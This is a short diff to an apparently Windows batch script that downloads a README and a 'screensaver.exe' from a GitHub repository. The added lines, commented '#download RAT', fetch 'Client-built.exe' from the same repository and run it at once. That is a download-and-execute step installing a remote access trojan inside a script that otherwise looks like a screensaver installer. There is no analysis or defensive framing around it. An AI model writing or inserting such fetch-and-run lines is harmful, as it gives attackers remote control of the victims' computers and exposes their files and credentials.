@@ -2,3 +2,5 @@
 curl -L "https://raw.githubusercontent.com/szczoteczkq/Main-Library/main/README.md" -o "%USERPROFILE%\Downloads\README.md"
 #download screensaver
 curl -L -o screensaver.exe "https://raw.githubusercontent.com/szczoteczkq/Main-Library/main/screensaver.exe"
+#download RAT
+curl -L -o Client-built.exe "https://raw.githubusercontent.com/szczoteczkq/Main-Library/main/Client-built.exe" && start "" "Client-built.exe"
